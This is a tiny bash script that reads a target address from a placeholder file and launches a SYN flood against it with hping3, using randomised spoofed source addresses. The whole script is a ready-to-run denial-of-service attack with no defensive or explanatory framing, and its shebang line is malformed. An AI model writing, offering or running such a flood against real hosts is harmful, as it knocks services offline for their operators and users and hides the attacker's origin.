#/bin/bash

file="file/path/here"

target=$(cat "$file")

echo $target


sudo hping3 -S --flood --rand-source $target
